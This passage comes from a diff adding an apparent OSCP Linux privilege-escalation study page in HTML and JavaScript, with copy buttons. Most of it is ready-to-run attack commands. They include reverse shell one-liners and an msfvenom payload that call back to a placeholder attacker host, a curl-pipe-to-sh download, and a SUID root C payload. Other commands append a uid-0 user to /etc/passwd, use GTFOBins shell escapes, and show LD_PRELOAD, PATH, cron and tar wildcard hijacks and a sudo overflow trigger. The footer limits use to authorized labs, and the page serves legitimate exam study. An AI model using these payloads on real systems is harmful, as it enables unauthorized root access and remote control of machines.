+<pre><span class="fn">python3</span> -m http.server 80      <span class="cmt"># serve your tools</span>
+<span class="fn">rlwrap</span> nc -lvnp 443            <span class="cmt"># catch the shell</span></pre></div>
+      </div>
+      <div>
+        <div class="col-h">On target — pull tools down</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">download.sh</span><button class="copy">copy</button></div>
+<pre><span class="fn">wget</span> http://KALI/linpeas.sh -O /tmp/l.sh
+<span class="fn">curl</span> http://KALI/pspy64 -o /tmp/pspy
+<span class="cmt"># fileless: run without touching disk</span>
+<span class="fn">curl</span> http://KALI/linpeas.sh | sh
+<span class="fn">chmod</span> +x /tmp/l.sh &amp;&amp; /tmp/l.sh</pre></div>
+      </div>
+      <div>
+        <div class="col-h">No network / writable spots</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">fallback.sh</span><button class="copy">copy</button></div>
+<pre><span class="cmt"># paste a small file as base64</span>
+<span class="fn">echo</span> &lt;base64&gt; | base64 -d &gt; /tmp/t
+<span class="cmt"># always-writable staging dirs</span>
+/tmp   /dev/shm   /var/tmp</pre></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- TECHNIQUES -->
+<section id="techniques">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">Ten ladders, with the variations</span>
+      <h2>The techniques</h2>
+      <p>Each card: <b>why it works</b> (plain English), <b>how to spot it</b>, the <b>possible ways</b> to abuse it (first one fails &mdash; try the next), the <b>OSCP note</b>, and the <b>rabbit hole</b> to avoid.</p>
+    </div>
+    <div class="toolbar">
+      <div class="search">
+        <span class="mag">⌕</span>
+        <input id="q" type="search" placeholder="Filter techniques & commands… (try: sudo, SUID, getcap, cron, shadow, docker)" aria-label="Filter techniques">
+        <span class="clr" id="qclr">✕</span>
+      </div>
+      <button class="mini" id="expand">Expand all</button>
+      <button class="mini" id="collapse">Collapse</button>
+    </div>
+    <div class="progress-bar">
+      <div class="pb-track"><div class="pb-fill" id="pbfill"></div></div>
+      <div class="pb-label"><b id="pbcount">0</b>/10 vectors understood</div>
+    </div>
+    <div class="cards" id="cards"></div>
+    <div class="nohit" id="nohit">No technique matches that filter. Try a shorter keyword.</div>
+  </div>
+</section>
+
+<!-- REFERENCE -->
+<section id="reference">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">The three tables you memorise</span>
+      <h2>Quick reference</h2>
+      <p>GTFOBins escapes for the SUID binary you just found, what each capability unlocks, and which famous local exploit matches the kernel/version you're on.</p>
+    </div>
+
+    <h3 style="font-family:var(--cond);font-size:21px;margin:4px 0 12px">GTFOBins SUID quick-wins</h3>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th class="mono">SUID binary</th><th class="mono">Spawn a root shell</th><th>Note</th></tr></thead>
+        <tbody>
+          <tr><td><span class="bin">bash / sh</span></td><td class="mono">bash -p</td><td><code>-p</code> keeps the effective uid</td></tr>
+          <tr><td><span class="bin">find</span></td><td class="mono">find . -exec /bin/sh -p \; -quit</td><td>the classic</td></tr>
+          <tr><td><span class="bin">vim</span></td><td class="mono">vim -c ':!/bin/sh -p'</td><td>or <code>:set shell</code> then <code>:shell</code></td></tr>
+          <tr><td><span class="bin">python</span></td><td class="mono">python -c 'import os;os.setuid(0);os.system("/bin/sh")'</td><td>python2/3</td></tr>
+          <tr><td><span class="bin">awk</span></td><td class="mono">awk 'BEGIN{system("/bin/sh -p")}'</td><td>&mdash;</td></tr>
+          <tr><td><span class="bin">less / more / man</span></td><td class="mono">less /etc/passwd &nbsp;→&nbsp; !/bin/sh</td><td>type <code>!</code> in the pager</td></tr>
+          <tr><td><span class="bin">env</span></td><td class="mono">env /bin/sh -p</td><td>&mdash;</td></tr>
+          <tr><td><span class="bin">nmap (old)</span></td><td class="mono">nmap --interactive &nbsp;→&nbsp; !sh</td><td>&lt; 5.21 only</td></tr>
+          <tr><td><span class="bin">cp / tee</span></td><td class="mono">write a root line into /etc/passwd</td><td>no shell &mdash; file write</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="font-size:13px;color:var(--text-faint);margin:10px 0 0;font-family:var(--mono)">Found a binary not here? Look it up at <a href="https://gtfobins.github.io" target="_blank" rel="noopener">gtfobins.github.io</a> &mdash; and use the <b>SUID</b> section, not the shell section.</p>
+
+    <h3 style="font-family:var(--cond);font-size:21px;margin:30px 0 12px">Capabilities → what it unlocks</h3>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th class="mono">Capability</th><th>Means</th><th class="mono">Abuse</th></tr></thead>
+        <tbody>
+          <tr><td><span class="bin">cap_setuid</span></td><td>Set your own uid to 0.</td><td class="mono">python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'</td></tr>
+          <tr><td><span class="bin">cap_dac_override</span></td><td>Write any file, perms ignored.</td><td class="mono">edit /etc/passwd or /etc/shadow</td></tr>
+          <tr><td><span class="bin">cap_dac_read_search</span></td><td>Read any file, perms ignored.</td><td class="mono">dump /etc/shadow</td></tr>
+          <tr><td><span class="bin">cap_sys_admin</span></td><td>Near-root: mount, namespaces.</td><td class="mono">mount host fs / unshare</td></tr>
+          <tr><td><span class="bin">cap_sys_ptrace</span></td><td>Attach to any process.</td><td class="mono">inject into a root process</td></tr>
+          <tr><td><span class="bin">cap_setgid</span></td><td>Set your gid.</td><td class="mono">join a privileged group</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3 style="font-family:var(--cond);font-size:21px;margin:30px 0 12px">Famous local / kernel exploits</h3>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Name</th><th class="mono">CVE</th><th>Affected</th><th>Reliability</th></tr></thead>
+        <tbody>
+          <tr><td><b>PwnKit</b> (pkexec)</td><td class="mono">CVE-2021-4034</td><td>polkit ≤ 0.120 — almost every distro</td><td><span class="pill t1">rock solid</span></td></tr>
+          <tr><td><b>DirtyPipe</b></td><td class="mono">CVE-2022-0847</td><td>kernel 5.8 – 5.16.10</td><td><span class="pill t1">rock solid</span></td></tr>
+          <tr><td><b>Baron Samedit</b> (sudo)</td><td class="mono">CVE-2021-3156</td><td>sudo 1.8.2–1.8.31p2 / 1.9.0–1.9.5p1</td><td><span class="pill t2">reliable</span></td></tr>
+          <tr><td><b>GameOver(lay)</b></td><td class="mono">CVE-2023-2640</td><td>Ubuntu 5.15 – 6.2</td><td><span class="pill t1">one-liner</span></td></tr>
+          <tr><td><b>Looney Tunables</b></td><td class="mono">CVE-2023-4911</td><td>glibc 2.34 – 2.38</td><td><span class="pill t2">reliable</span></td></tr>
+          <tr><td><b>DirtyCow</b></td><td class="mono">CVE-2016-5195</td><td>kernel 2.6.22 – 4.8.3</td><td><span class="pill t3">can crash</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="font-size:13px;color:var(--text-faint);margin:10px 0 0;font-family:var(--mono)">Match with <code>uname -r</code>, <code>sudo --version</code>, <code>cat /etc/os-release</code>. Prefer the <b>rock-solid</b> ones; the crashy ones are a genuine last resort.</p>
+  </div>
+</section>
+
+<!-- SHELLS / PAYLOADS -->
+<section id="payloads">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">Reverse shells &amp; root payloads</span>
+      <h2>Shell cookbook</h2>
+      <p>The one-liners to get a callback, and the tiny C program you compile for NFS and shared-library tricks. Use a non-Meterpreter listener to stay clear of the Metasploit restriction.</p>
+    </div>
+    <div class="cols2">
+      <div>
+        <div class="col-h">Reverse shell one-liners</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">revshell.sh</span><button class="copy">copy</button></div>
+<pre><span class="cmt"># bash</span>
+bash -i &gt;&amp; /dev/tcp/KALI/443 0&gt;&amp;1
+<span class="cmt"># nc without -e</span>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc KALI 443 &gt;/tmp/f
+<span class="cmt"># python3</span>
+python3 -c <span class="str">'import socket,os,pty;s=socket.socket();s.connect(("KALI",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'</span></pre></div>
+      </div>
+      <div>
+        <div class="col-h">SUID C payload (NFS / lib hijack)</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">root.c</span><button class="copy">copy</button></div>
+<pre><span class="cmt">// root.c — runs /bin/bash as owner</span>
+<span class="fn">int</span> main(){ setuid(0); setgid(0);
+  system(<span class="str">"/bin/bash -p"</span>); }
+<span class="cmt"># compile static, set the SUID bit as root</span>
+gcc root.c -o rootsh -w
+chmod +s rootsh   <span class="cmt"># then: ./rootsh</span></pre></div>
+      </div>
+      <div>
+        <div class="col-h">msfvenom (allowed everywhere)</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">msfvenom.sh</span><button class="copy">copy</button></div>
+<pre><span class="fn">msfvenom</span> -p linux/x64/shell_reverse_tcp \
+  LHOST=KALI LPORT=443 -f elf -o shell.elf</pre></div>
+      </div>
+      <div>
+        <div class="col-h">No reverse shell? Add a root user</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">addroot.sh</span><button class="copy">copy</button></div>
+<pre><span class="cmt"># hash a password, append a uid-0 user</span>
+openssl passwd -1 -salt x pass123
+echo <span class="str">'r00t:HASH:0:0::/root:/bin/bash'</span> &gt;&gt; /etc/passwd
+su r00t   <span class="cmt"># often cleaner than a callback</span></pre></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PROOF -->
+<section id="proof">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">The exam is passed here, not in the shell</span>
+      <h2>Capture proof before you touch anything else</h2>
+      <p>The moment <code>id</code> returns <code>uid=0(root)</code>, stop and screenshot. Your screenshot must show the flag contents <em>and</em> your attacking IP in the same frame.</p>
+    </div>
+    <div class="cols2">
+      <div>
+        <div class="col-h">Run these, screenshot the output</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">proof.sh</span><button class="copy">copy</button></div>
+<pre><span class="fn">id</span>                   <span class="cmt"># must read uid=0(root)</span>
+<span class="fn">hostname</span>
+<span class="fn">ip</span> a   <span class="cmt"># or: hostname -I  — show the target IP</span>
+<span class="fn">cat</span> /root/proof.txt</pre></div>
+      </div>
+      <div>
+        <div class="col-h">Where the flags live</div>
+        <div class="panel" style="box-shadow:none">
+          <p style="font-family:var(--mono);font-size:13px;line-height:1.9;color:var(--text-dim)">
+          <b style="color:var(--text)">local.txt</b> &mdash; user flag<br>
+          <span style="color:var(--text-faint)">/home/&lt;user&gt;/local.txt</span><br><br>
+          <b style="color:var(--text)">proof.txt</b> &mdash; root flag<br>
+          <span style="color:var(--text-faint)">/root/proof.txt</span></p>
+        </div>
+        <p style="font-size:13px;color:var(--text-dim);margin-top:10px">Grab <code>local.txt</code> the instant you get the first shell &mdash; don't wait until after privesc, in case the box resets. Note your <b>exact reproduction steps</b> as you go; you write the report from them.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- DRILL -->
+<section id="drill">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">Reading is not rooting</span>
+      <h2>Drill it: from reading to rooting</h2>
+      <p>You learn Linux privesc by recognising the vector on a box you've never seen. Two steps: practise each ladder <em>in isolation</em>, then hunt it <em>in the wild</em>.</p>
+    </div>
+    <div class="col-h">Step 1 — learn each vector in isolation</div>
+    <div class="cols2" style="grid-template-columns:1fr 1fr 1fr">
+      <div class="panel"><h4>THM · Linux PrivEsc</h4><p>Tib3rius' room has a <b>dedicated lab for every vector on this page</b> &mdash; sudo, SUID, capabilities, cron, PATH, NFS, passwd. The fastest way to touch all ten. <a href="https://tryhackme.com/room/linuxprivesc" target="_blank" rel="noopener">Start here →</a></p></div>
+      <div class="panel"><h4>HTB Academy · Linux PrivEsc</h4><p>The <b>Linux Privilege Escalation</b> module: guided theory plus graded exercises that map almost 1:1 to these cards. Great second pass. <a href="https://academy.hackthebox.com/module/details/51" target="_blank" rel="noopener">Module →</a></p></div>
+      <div class="panel"><h4>Run it yourself</h4><p>On <b>every</b> box, run <code>linpeas</code> + <code>pspy</code> + <code>lse.sh</code> &mdash; then, before you read their output, write down which vector <em>you</em> think it is. Train the eye, not the tool.</p></div>
+    </div>
+
+    <div class="col-h" style="margin-top:26px">Step 2 — recognise it in the wild</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Vector</th><th>Train it on</th><th class="mono">Where</th><th>What the box teaches</th></tr></thead>
+        <tbody>
+          <tr><td><b>sudo → GTFOBins</b></td><td class="mono">Shocker · Beep</td><td>HTB</td><td>NOPASSWD binary → GTFOBins → root</td></tr>
+          <tr><td><b>SUID / SGID</b></td><td class="mono">Tib3rius room · SUID lab</td><td>THM</td><td>find /-perm 4000 → GTFOBins</td></tr>
+          <tr><td><b>Capabilities</b></td><td class="mono">Tib3rius room · caps lab</td><td>THM</td><td>getcap → cap_setuid</td></tr>
+          <tr><td><b>Cron / timers</b></td><td class="mono">Tib3rius room · cron lab</td><td>THM</td><td>writable root cron + pspy timing</td></tr>
+          <tr><td><b>Credentials &amp; keys</b></td><td class="mono">Blocky · Sunday</td><td>HTB</td><td>password / hash reuse → su</td></tr>
+          <tr><td><b>Kernel / local</b></td><td class="mono">PwnKit &amp; DirtyPipe labs</td><td>THM</td><td>LES → compile static → run</td></tr>
+          <tr><td><b>PATH · /etc/passwd · NFS · groups</b></td><td class="mono">Tib3rius room — per-vector labs</td><td>THM</td><td>each one isolated, so you can't miss it</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="font-size:13px;color:var(--text-faint);margin-top:10px;font-family:var(--mono)">On <b>Proving Grounds</b> (your home turf): filter Practice → Linux and take one vector at a time. Platforms patch boxes, so always confirm the <em>current</em> intended path.</p>
+    <p class="loop-note" style="margin-top:22px"><b>How to drill each box:</b> get a shell → stabilise the TTY → grab <code>local.txt</code> → run the Method loop → try the vector <b>manually before</b> linpeas confirms it → write a 5-line report with a proof screenshot. Ten boxes in, the ladder stops being a checklist and starts being instinct.</p>
+  </div>
+</section>
+
+<!-- TRAPS -->
+<section id="traps">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">Learn from others' wasted hours</span>
+      <h2>Traps that eat exam time</h2>
+      <p>These are the mistakes that cost points. Read them now so you recognise them at 2 a.m. during the exam.</p>
+    </div>
+    <div class="holes">
+      <div class="hole"><div class="h"><span class="sig">🕳️</span> Kernel exploit first</div><p><b>The trap:</b> you see an old <code>uname -r</code> and immediately hunt a kernel exploit. <b>Why it hurts:</b> they're unreliable and can panic the box. Kernel exploits are a <b>last resort</b>, after sudo / SUID / cron / caps are ruled out.</p></div>
+      <div class="hole"><div class="h"><span class="sig">⏭️</span> Skimming linpeas</div><p><b>The trap:</b> linpeas printed a wall of colour so you only chase the red. <b>Why it hurts:</b> the intended path is often a <b>yellow</b> finding. Read it slowly; the box is telling you the answer.</p></div>
+      <div class="hole"><div class="h"><span class="sig">⌛</span> Forgetting to stabilise</div><p><b>The trap:</b> fighting a dumb web shell &mdash; no tab, no Ctrl-C, editors break. <b>Why it hurts:</b> you waste time and mistype exploits. <b>Upgrade the TTY first</b> (python pty + stty raw).</p></div>
+      <div class="hole"><div class="h"><span class="sig">🐚</span> Dropping the <code>-p</code></div><p><b>The trap:</b> a SUID bash gives a shell but <code>id</code> still shows your user. <b>Why it hurts:</b> bash drops privileges by default &mdash; you need <code>bash -p</code> / <code>sh -p</code> to keep the effective uid.</p></div>
+      <div class="hole"><div class="h"><span class="sig">👁️</span> Not watching with pspy</div><p><b>The trap:</b> <code>crontab -l</code> is empty so you assume no cron. <b>Why it hurts:</b> root's cron isn't in your crontab. <b>Run <code>pspy</code></b> to watch root processes and timers fire live.</p></div>
+      <div class="hole"><div class="h"><span class="sig">📸</span> No proof screenshot</div><p><b>The trap:</b> you get root, grab the flag, move on &mdash; then realise you never captured proof. <b>Why it hurts:</b> a point you can't evidence is a point you didn't earn. Screenshot <code>id</code> + flag + your IP <b>before</b> anything else.</p></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap foot-grid">
+    <div>
+      <div class="scope"><span class="lk">▸</span><span>For authorized labs and the OSCP exam only &mdash; your own machines, a platform you pay for (PG / HTB / THM), or an engagement with written permission. Same techniques, one rule: get the scope in writing first.</span></div>
+      <p class="srcs">Grounded in the PEN-200 methodology · refs: <a href="https://gtfobins.github.io" target="_blank" rel="noopener">GTFOBins</a>, <a href="https://book.hacktricks.wiki" target="_blank" rel="noopener">HackTricks</a>, <a href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener">PEASS-ng</a>, <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener">pspy</a>.</p>
+    </div>
+    <p class="foot-note"><b>How to use this:</b> keep it open on a second screen during practice. Shell → stabilise → run the Method loop → open the Map → search the technique → work the ways top-to-bottom. This is the companion to the Windows manual &mdash; between them you've got both halves of the OSCP. You've got this. 🐧</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var RM=window.matchMedia&&window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+  /* theme */
+  var root=document.documentElement,tbtn=document.getElementById("theme"),
+      tico=document.getElementById("theme-ico"),ttxt=document.getElementById("theme-txt");
+  function sysDark(){return window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;}
+  function curDark(){var t=root.getAttribute("data-theme");return t?t==="dark":sysDark();}
+  function paintToggle(){var d=curDark();tico.textContent=d?"☾":"☀";ttxt.textContent=d?"Dark":"Light";}
+  try{var sv=localStorage.getItem("ctr-theme");if(sv)root.setAttribute("data-theme",sv);}catch(e){}
+  paintToggle();
+  tbtn.addEventListener("click",function(){var n=curDark()?"light":"dark";root.setAttribute("data-theme",n);try{localStorage.setItem("ctr-theme",n);}catch(e){}paintToggle();});
+
+  /* ladder */
+  var rungs=[].slice.call(document.querySelectorAll("#rungs .rung"));
+  var rootRung=document.querySelector('#rungs .rung[data-k="root"]');if(rootRung)rootRung.classList.add("lit");
+  if(!RM){rungs.forEach(function(r,i){setTimeout(function(){r.classList.add("lit");setTimeout(function(){if(r.dataset.k!=="root")r.classList.remove("lit");},520);},400+i*260);});}
+
+  /* loop pulse */
+  var steps=[].slice.call(document.querySelectorAll(".loop-step"));
+  if(!RM&&steps.length){var si=0;setInterval(function(){steps.forEach(function(s){s.classList.remove("active");});steps[si].classList.add("active");si=(si+1)%steps.length;},1500);}
+
+  function T(name,code){return '<div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">'+name+'</span><button class="copy">copy</button></div><pre>'+code+'</pre></div>';}
+
+  var V=[
+  {id:"sudo",kind:"accent",short:"sudo rights",title:"sudo -l → GTFOBins",sub:"the single highest-yield check",prereq:"a sudo entry",os:"all",diff:"easy",
+   analogy:"<code>sudo -l</code> lists the programs the admin said you may run <b>as root</b> &mdash; like being handed a few of the manager's keys. The catch: most programs can open a shell or read any file, so a key to <code>vim</code> or <code>find</code> is really a key to the whole building.",
+   why:"Admins whitelist a specific binary so you can restart a service or edit a file as root. But if that binary can spawn a shell, read arbitrary files, or load your code, the narrow permission becomes <b>full root</b>. This is the first thing to check and the most common OSCP Linux win.",
+   enum:[T("spot.sh",`<span class="fn">sudo</span> -l            <span class="cmt"># what can I run as root? NOPASSWD = free</span>
+<span class="fn">sudo</span> --version     <span class="cmt"># old sudo? → Baron Samedit (see Reference)</span>`)],
+   ways:[
+    {label:"Way 1 — GTFOBins the allowed binary",tag:"first",note:"Look the binary up on GTFOBins under <b>sudo</b>.",code:`<span class="cmt"># sudo -l shows: (root) NOPASSWD: /usr/bin/find</span>
+<span class="fn">sudo</span> find . -exec /bin/sh \\; -quit
+<span class="cmt"># other classics</span>
+<span class="fn">sudo</span> vim -c ':!/bin/sh'
+<span class="fn">sudo</span> awk 'BEGIN{system("/bin/sh")}'`},
+    {label:"Way 2 — LD_PRELOAD / LD_LIBRARY_PATH",tag:"env_keep",note:"sudo -l shows <code>env_keep+=LD_PRELOAD</code> — load your own library into a root run.",code:`<span class="cmt"># pe.c: constructor → setuid(0); system("/bin/bash -p");</span>
+gcc -fPIC -shared -nostartfiles -o /tmp/pe.so pe.c
+<span class="fn">sudo</span> LD_PRELOAD=/tmp/pe.so &lt;any-allowed-binary&gt;`},
+    {label:"Way 3 — writable / injectable script",tag:"review it",note:"NOPASSWD on a custom script? Read it for a relative command (PATH hijack) or an unquoted variable.",code:`<span class="cmt"># if the script calls e.g. "tar ..." by name:</span>
+echo -e '#!/bin/bash\\n/bin/bash -p' &gt; /tmp/tar
+chmod +x /tmp/tar ; export PATH=/tmp:$PATH
+<span class="fn">sudo</span> /opt/backup.sh`},
+    {label:"Way 4 — sudo itself is vulnerable",tag:"CVE",note:"Very old sudo → Baron Samedit (CVE-2021-3156), no sudo rights needed at all.",code:`<span class="fn">sudoedit</span> -s '\\' $(python3 -c 'print("A"*1000)')
+<span class="cmt"># "malloc(): memory corruption" → likely vulnerable → run the PoC</span>`}],
+   oscp:"GTFOBins and LD_PRELOAD are manual &mdash; fully allowed. Always run <code>sudo -l</code> first on <b>every</b> box; it alone solves a large share of OSCP Linux boxes.",
+   watch:"<code>(ALL)</code> but it asks for a password you don't have? Go hunt credentials (card 9) &mdash; a reused password unlocks this. And read custom scripts carefully: the win is usually a <b>relative command</b> or an unquoted path inside them."},
+
+  {id:"suid",kind:"accent",short:"SUID / SGID",title:"SUID / SGID binaries",sub:"runs as the file's owner (often root)",prereq:"odd SUID binary",os:"all",diff:"easy",
+   analogy:"A <b>SUID</b> binary runs with the <em>owner's</em> privileges, not yours &mdash; a root-owned SUID runs as root no matter who starts it. It's a borrowed-authority badge. If you can make that badge-holder run <em>your</em> command, you inherit root.",
+   why:"SUID exists for legit tools like <code>passwd</code>. The danger is an <b>unusual</b> SUID binary (a shell, an interpreter, a custom program) that can be coaxed into executing your commands or reading protected files while wearing root's badge.",
+   enum:[T("spot.sh",`<span class="fn">find</span> / -perm -4000 -type f 2&gt;/dev/null   <span class="cmt"># SUID</span>
+<span class="fn">find</span> / -perm -2000 -type f 2&gt;/dev/null   <span class="cmt"># SGID</span>
+<span class="cmt"># compare against a default install; odd ones are the lead</span>`)],
+   ways:[
+    {label:"Way 1 — GTFOBins quick-win",tag:"first",note:"Standard binary? One command (see the GTFOBins table). Remember the <code>-p</code>.",code:`./bash -p
+./find . -exec /bin/sh -p \\; -quit
+./python -c 'import os;os.setuid(0);os.system("/bin/sh")'`},
+    {label:"Way 2 — shared library hijack",tag:"custom",note:"A custom SUID that loads a .so from a writable path → plant your own.",code:`<span class="fn">ldd</span> /usr/local/bin/suidbin      <span class="cmt"># which libs, which paths</span>
+<span class="fn">strace</span> ./suidbin 2&gt;&amp;1 | grep -i open.*\\.so
+<span class="cmt"># evil.c: constructor → setuid(0);system("/bin/bash -p")</span>
+gcc -shared -fPIC -o /writable/lib.so evil.c`},
+    {label:"Way 3 — PATH hijack inside it",tag:"relative",note:"Binary calls another command by name (not full path).",code:`<span class="fn">strings</span> ./suidbin        <span class="cmt"># spot a bare command like "service"</span>
+echo '/bin/bash -p' &gt; /tmp/service; chmod +x /tmp/service
+export PATH=/tmp:$PATH ; ./suidbin`},
+    {label:"Way 4 — read protected files",tag:"no shell",note:"A SUID reader (cp/cat/less) can't shell but can hand you /etc/shadow.",code:`./cp /etc/shadow /tmp/s   <span class="cmt"># then crack offline with hashcat/john</span>`}],
+   oscp:"All manual. <code>gcc</code> on the box is allowed; if it's missing, compile the .so/.c on Kali and transfer it. Map every unusual SUID to a GTFOBins entry before anything fancier.",
+   watch:"If a GTFOBins shell gives you your own uid back, you <b>dropped <code>-p</code></b>. For custom binaries, don't guess &mdash; <code>strace</code>/<code>ltrace</code> them to see exactly which file or command they reach for."},
+
+  {id:"caps",kind:"accent",short:"Capabilities",title:"Linux Capabilities",sub:"a sliver of root on one binary",prereq:"a dangerous cap",os:"all",diff:"med",
+   analogy:"Capabilities slice root's power into pieces so a program gets just one (bind a low port, say) instead of full root. But a few slices &mdash; above all <b>cap_setuid</b> &mdash; are basically root by themselves. It's a SUID bit that <code>find</code> won't show you.",
+   why:"A binary with <code>cap_setuid</code> can set its uid to 0 and hand you a root shell &mdash; no SUID bit needed. <code>cap_dac_override</code>/<code>cap_dac_read_search</code> let you write or read any file, so you edit <code>/etc/passwd</code> or dump <code>/etc/shadow</code>.",
+   enum:[T("spot.sh",`<span class="fn">getcap</span> -r / 2&gt;/dev/null
+<span class="cmt"># e.g.  /usr/bin/python3 = cap_setuid+ep</span>`)],
+   ways:[
+    {label:"Way 1 — cap_setuid → instant root",tag:"critical",note:"Any interpreter with it flips you to uid 0.",code:`python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+<span class="cmt"># perl:</span> perl -e 'use POSIX;POSIX::setuid(0);exec "/bin/bash";'`},
+    {label:"Way 2 — cap_dac_override → write passwd",tag:"write any",note:"Bypass all file permissions — add a root user or edit shadow.",code:`<span class="cmt"># e.g. vim has cap_dac_override:</span>
+vim /etc/passwd   <span class="cmt"># add  r00t:...:0:0::/root:/bin/bash</span>`},
+    {label:"Way 3 — cap_dac_read_search → read shadow",tag:"read any",note:"Read any file regardless of perms; crack root's hash offline.",code:`<span class="cmt"># e.g. tar has it:</span>
+tar czf /tmp/s.tar.gz /etc/shadow &amp;&amp; tar xzf /tmp/s.tar.gz -C /tmp`}],
+   oscp:"Native and allowed. <code>getcap -r /</code> takes one second &mdash; add it to your first-pass enumeration right after <code>sudo -l</code> and SUID. linpeas flags caps automatically.",
+   watch:"The cap must end in <code>+ep</code> (effective) to be usable directly. A capability shows up in <code>getcap</code>, never in <code>find -perm -4000</code> &mdash; so don't conclude \"no SUID, no path\" without checking caps too."},
+
+  {id:"cron",kind:"cyan",short:"Cron / timers",title:"Cron, timers & services",sub:"root runs your file on a schedule",prereq:"writable job target",os:"all",diff:"med",
+   analogy:"Cron is root's <b>alarm clock</b>: it runs scripts on a timer, as root. If you can edit the script it runs, drop a file where it looks, or exploit how it globs filenames, root executes your code at the next tick &mdash; no exploit, just patience.",
+   why:"Admins schedule backups and cleanups as root. If the script is <b>world-writable</b>, calls a command by relative name (PATH), or runs <code>tar/rsync *</code> in a directory you control (wildcard injection), you get root execution. Writable systemd <code>.service</code> units work the same way.",
+   enum:[T("spot.sh",`<span class="fn">cat</span> /etc/crontab ; ls -la /etc/cron.*
+<span class="fn">systemctl</span> list-timers --all
+<span class="cmt"># root's cron is NOT in your crontab — watch it live:</span>
+<span class="fn">./pspy64</span>`)],
+   ways:[
+    {label:"Way 1 — writable cron script",tag:"cleanest",note:"The scheduled script is writable by you → append a root-setuid drop.",code:`echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt;&gt; /path/job.sh
+<span class="cmt"># wait for the tick, then:</span>  /tmp/rootbash -p`},
+    {label:"Way 2 — PATH hijack in cron",tag:"relative",note:"crontab sets a PATH and the job calls a command by name.",code:`<span class="cmt"># PATH=/home/user:... and job runs "overwrite.sh"? plant it:</span>
+echo -e '#!/bin/bash\\ncp /bin/bash /tmp/rb;chmod +s /tmp/rb' &gt; /home/user/overwrite.sh
+chmod +x /home/user/overwrite.sh`},
+    {label:"Way 3 — tar/rsync wildcard injection",tag:"glob",note:'Cron runs "tar czf bak.tar.gz *" in a dir you can write — filenames become options.',code:`echo 'cp /bin/bash /tmp/rb;chmod +s /tmp/rb' &gt; sh.sh
+echo "" &gt; '--checkpoint-action=exec=sh sh.sh'
+echo "" &gt; '--checkpoint=1'`},
+    {label:"Way 4 — writable systemd unit",tag:"service",note:"A .service file you can edit → set ExecStart, restart (or wait for reboot).",code:`<span class="fn">find</span> /etc/systemd -writable 2&gt;/dev/null
+<span class="cmt"># edit ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb;chmod +s /tmp/rb'</span>
+systemctl daemon-reload &amp;&amp; systemctl restart &lt;unit&gt;`}],
+   oscp:"<code>pspy</code> is pure enumeration and allowed &mdash; it's the single best tool here because it shows root cron you can't see in <code>crontab -l</code>. Note the schedule so you know when your payload fires.",
+   watch:"Don't assume the job ran &mdash; confirm your SUID bash / shell appeared. If the interval is long, <code>pspy</code> tells you exactly when to expect it instead of guessing."},
+
+  {id:"path",kind:"cyan",short:"PATH hijack",title:"PATH Hijacking",sub:"a root program calls a command by name",prereq:"relative command + writable PATH dir",os:"all",diff:"med",
+   analogy:"When a program runs <code>service</code> instead of <code>/usr/sbin/service</code>, the shell searches <code>$PATH</code> folder by folder and runs the <b>first match</b>. Put your own <code>service</code> in a folder that's searched first, and the root program runs yours instead &mdash; you swapped the sign on the door.",
+   why:"Scripts and even compiled binaries often call helpers by bare name for convenience. If a root-run script (cron, sudo, SUID) does this and you can prepend a writable directory to its <code>PATH</code>, your fake binary executes as root.",
+   enum:[T("spot.sh",`<span class="cmt"># find the relative call inside the root script/binary</span>
+<span class="fn">strings</span> /usr/local/bin/suidbin | less
+<span class="fn">cat</span> /opt/*.sh    <span class="cmt"># look for bare command names, no leading /</span>`)],
+   ways:[
+    {label:"Way 1 — prepend PATH, plant the binary",tag:"core",note:"Works for a SUID binary or a script you can trigger as root.",code:`echo '/bin/bash -p' &gt; /tmp/service
+chmod +x /tmp/service
+export PATH=/tmp:$PATH
+/usr/local/bin/suidbin      <span class="cmt"># runs /tmp/service as root</span>`}],
+   oscp:"Pure shell, allowed. PATH hijacking is the mechanism behind many sudo/SUID/cron wins &mdash; when you see a <b>bare command name</b> in anything root runs, this is your move.",
